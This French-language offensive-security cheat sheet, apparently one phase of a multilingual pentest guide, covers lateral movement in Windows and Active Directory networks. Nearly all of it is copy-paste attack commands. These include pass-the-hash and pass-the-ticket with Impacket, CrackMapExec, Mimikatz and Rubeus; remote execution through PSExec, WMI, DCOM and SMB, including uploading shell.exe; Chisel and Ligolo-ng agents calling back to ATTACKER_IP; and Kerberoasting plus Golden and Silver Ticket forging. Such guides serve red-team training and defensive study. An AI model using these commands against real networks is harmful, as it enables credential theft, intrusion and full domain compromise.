# ➡️ Phase 4: Déplacement latéral

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](04-Lateral-Movement.tr.md) • [🇬🇷 Ελληνικά](04-Lateral-Movement.el.md)

```
  ██╗      █████╗ ████████╗███████╗██████╗  █████╗ ██╗     
  ██║     ██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██║     
  ██║     ███████║   ██║   █████╗  ██████╔╝███████║██║     
  ██║     ██╔══██║   ██║   ██╔══╝  ██╔══██╗██╔══██║██║     
  ███████╗██║  ██║   ██║   ███████╗██║  ██║██║  ██║███████╗
  ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
        ███╗   ███╗ ██████╗ ██╗   ██╗███████╗███╗   ███╗███████╗███╗   ██╗████████╗
        ████╗ ████║██╔═══██╗██║   ██║██╔════╝████╗ ████║██╔════╝████╗  ██║╚══██╔══╝
        ██╔████╔██║██║   ██║██║   ██║█████╗  ██╔████╔██║█████╗  ██╔██╗ ██║   ██║   
        ██║╚██╔╝██║██║   ██║╚██╗ ██╔╝██╔══╝  ██║╚██╔╝██║██╔══╝  ██║╚██╗██║   ██║   
        ██║ ╚═╝ ██║╚██████╔╝ ╚████╔╝ ███████╗██║ ╚═╝ ██║███████╗██║ ╚████║   ██║   
        ╚═╝     ╚═╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   
```

**Objectif :** Passer du système compromis à d’autres systèmes du réseau.

> **Précision :** les prérequis du tableau sont simplifiés : les autorisations réelles dépendent des ACL, des groupes et de la configuration du service distant. « Plus discret » ne signifie pas indétectable. Les exemples de tickets Kerberos et d’outils correspondent au contexte du guide ; leur fonctionnement dépend de la configuration et des protections du domaine.

---

## 🔑 Déplacement à l’aide d’identifiants

### Pass-the-Hash (PTH)

Réutilisation d’une empreinte NTLM pour s’authentifier sans connaître le mot de passe en clair.
```bash
# Impacket PSExec avec une empreinte
impacket-psexec -hashes :NTLM_HASH administrator@192.168.1.10

# Impacket WMIExec
impacket-wmiexec -hashes :NTLM_HASH administrator@192.168.1.10

# Impacket SMBExec
impacket-smbexec -hashes :NTLM_HASH administrator@192.168.1.10

# CrackMapExec
crackmapexec smb 192.168.1.10 -u administrator -H NTLM_HASH
crackmapexec smb 192.168.1.10 -u administrator -H NTLM_HASH -x "whoami"

# Evil-WinRM
evil-winrm -i 192.168.1.10 -u administrator -H NTLM_HASH
```

### Pass-the-Ticket (PTT)

Réutilisation d’un ticket Kerberos pour s’authentifier.
```powershell
# Exporter un ticket depuis la mémoire (Mimikatz)
sekurlsa::tickets /export

# Importer un ticket
kerberos::ptt ticket.kirbi

# Ou avec Rubeus
.\Rubeus.exe ptt /ticket:BASE64_TICKET

# Vérifier le ticket
klist
```

### Overpass-the-Hash (Pass-the-Key)

Utilisation d’une clé dérivée du mot de passe pour demander un ticket Kerberos.
```powershell
# Mimikatz — demander un TGT avec une empreinte NTLM
sekurlsa::pth /user:administrator /domain:domain.local /ntlm:HASH /run:cmd

# Rubeus
.\Rubeus.exe asktgt /user:administrator /rc4:NTLM_HASH /ptt
```

### Pass-the-Certificate

Authentification à l’aide d’un certificat et de sa clé privée.
```bash
# Utiliser un certificat pour l’authentification
certipy auth -pfx admin.pfx -dc-ip 192.168.1.1

# Avec Rubeus
.\Rubeus.exe asktgt /user:admin /certificate:admin.pfx /ptt
```

---

## 🖥️ Méthodes d’exécution à distance

### PSExec
```bash
# Impacket PSExec
impacket-psexec domain/administrator:password@192.168.1.10
impacket-psexec -hashes :HASH administrator@192.168.1.10

# Metasploit PSExec
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.10
set SMBUser administrator
set SMBPass password
run
```

### WMIExec
```bash
# Impacket WMIExec (présenté comme plus discret)
impacket-wmiexec domain/administrator:password@192.168.1.10
impacket-wmiexec -hashes :HASH administrator@192.168.1.10

# PowerShell WMI
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami > C:\temp\out.txt" -ComputerName 192.168.1.10 -Credential $cred
```

### WinRM / Evil-WinRM
```bash
# Evil-WinRM avec un mot de passe
evil-winrm -i 192.168.1.10 -u administrator -p 'password'

# Evil-WinRM avec une empreinte
evil-winrm -i 192.168.1.10 -u administrator -H NTLM_HASH

# Communication à distance PowerShell
Enter-PSSession -ComputerName 192.168.1.10 -Credential $cred
Invoke-Command -ComputerName 192.168.1.10 -Credential $cred -ScriptBlock { whoami }
```

### DCOM
```bash
# Impacket DCOM
impacket-dcomexec domain/administrator:password@192.168.1.10

# PowerShell DCOM
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.1.10"))
$com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```

### SMB
```bash
# Exécution de commandes avec CrackMapExec
crackmapexec smb 192.168.1.10 -u admin -p password -x "whoami"
crackmapexec smb 192.168.1.10 -u admin -p password -X "Get-Process"  # PowerShell

# Copie de fichiers par SMB
smbclient //192.168.1.10/C$ -U administrator
put shell.exe

# À la manière de PsExec
crackmapexec smb 192.168.1.10 -u admin -p password --exec-method smbexec -x "whoami"
```

### RDP
```bash
# xfreerdp
xfreerdp /v:192.168.1.10 /u:administrator /p:password /dynamic-resolution

# Avec une empreinte NTLM (mode Restricted Admin)
xfreerdp /v:192.168.1.10 /u:administrator /pth:NTLM_HASH

# Activer RDP à distance
crackmapexec smb 192.168.1.10 -u admin -p password -M rdp -o ACTION=enable
```

### SSH (Linux)
```bash
# SSH avec un mot de passe
ssh user@192.168.1.10

# SSH avec une clé
ssh -i id_rsa user@192.168.1.10

# Tunnels SSH et pivot réseau
ssh -D 9050 user@192.168.1.10  # Proxy SOCKS
ssh -L 8080:internal:80 user@192.168.1.10  # Redirection locale de port
```

---

## 🔄 Pivot réseau (accès à un réseau via une machine intermédiaire)

### Tunnels SSH
```bash
# Redirection locale de port (accéder à internal:80 par localhost:8080)
ssh -L 8080:192.168.2.10:80 user@192.168.1.10

# Proxy SOCKS dynamique
ssh -D 9050 user@192.168.1.10
proxychains nmap 192.168.2.0/24

# Redirection distante de port
ssh -R 4444:localhost:4444 user@192.168.1.10
```

### Chisel
```bash
# Sur la machine d’attaque (serveur)
./chisel server --reverse --port 8080

# Sur la machine cible (client)
./chisel client ATTACKER_IP:8080 R:socks

# Utiliser avec proxychains
proxychains nmap 192.168.2.10
```

### Ligolo-ng
```bash
# Sur la machine d’attaque
./proxy -selfcert

# Sur la machine cible
./agent -connect ATTACKER_IP:11601 -ignore-cert

# Dans la console du proxy
session
start
```

### Pivot réseau avec Metasploit
```bash
# Ajouter une route via la session Meterpreter
run autoroute -s 192.168.2.0/24

# Ou manuellement
route add 192.168.2.0 255.255.255.0 1

# Proxy SOCKS
use auxiliary/server/socks_proxy
set SRVPORT 9050
run -j
```

---

## 🎫 Attaques Kerberos

### Kerberoasting

Récupération de tickets de service pour tenter de retrouver hors ligne le mot de passe du compte de service.
```bash
# Obtenir les tickets de service
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.1 -request

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Casser les empreintes avec hashcat
hashcat -m 13100 hashes.txt wordlist.txt
```

### AS-REP Roasting

Collecte de réponses Kerberos pour des comptes sans préauthentification afin de tenter une récupération hors ligne du mot de passe.
```bash
# Rechercher les utilisateurs sans préauthentification
GetNPUsers.py domain.local/ -no-pass -usersfile users.txt -dc-ip 192.168.1.1

# Casser les empreintes
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

### Golden Ticket

Ticket TGT forgé à l’aide de la clé du compte krbtgt.
```powershell
# Obtenir d’abord l’empreinte de krbtgt, puis :
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt
```

### Silver Ticket

Ticket de service forgé à l’aide de la clé du compte associé au service.
```powershell
# Créer un ticket pour un service donné
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt
```

---

## 📊 Aide-mémoire

### Techniques de déplacement latéral

| Technique | Port | Outil |
|-----------|------|------|
| PSExec | 445/SMB | impacket, metasploit |
| WMIExec | 135/WMI | impacket |
| WinRM | 5985/5986 | evil-winrm |
| RDP | 3389 | xfreerdp |
| SSH | 22 | ssh |
| DCOM | 135+ | impacket |

### Identifiants requis

| Méthode | Condition requise |
|--------|-------------|
| Pass-the-Hash | Empreinte NTLM |
| Pass-the-Ticket | Ticket Kerberos |
| PSExec | Droits administrateur + accès SMB |
| WinRM | WinRM activé + droits administrateur |
| RDP | RDP activé + appartenance au groupe RDP |

---

## 🔗 Fiches associées

- [Impacket](../../Impacket/README.md)
- [CrackMapExec](../../CrackMapExec/README.md)
- [Evil-WinRM](../../Evil-WinRM/README.md)
- [Mimikatz](../../Mimikatz/README.md)
- [Rubeus](../../Rubeus/README.md)

---

**Phase précédente :** [← 03 - Élévation de privilèges](./03-Privilege-Escalation.fr.md)

**Phase suivante :** [05 - Persistance →](./05-Persistence.fr.md)
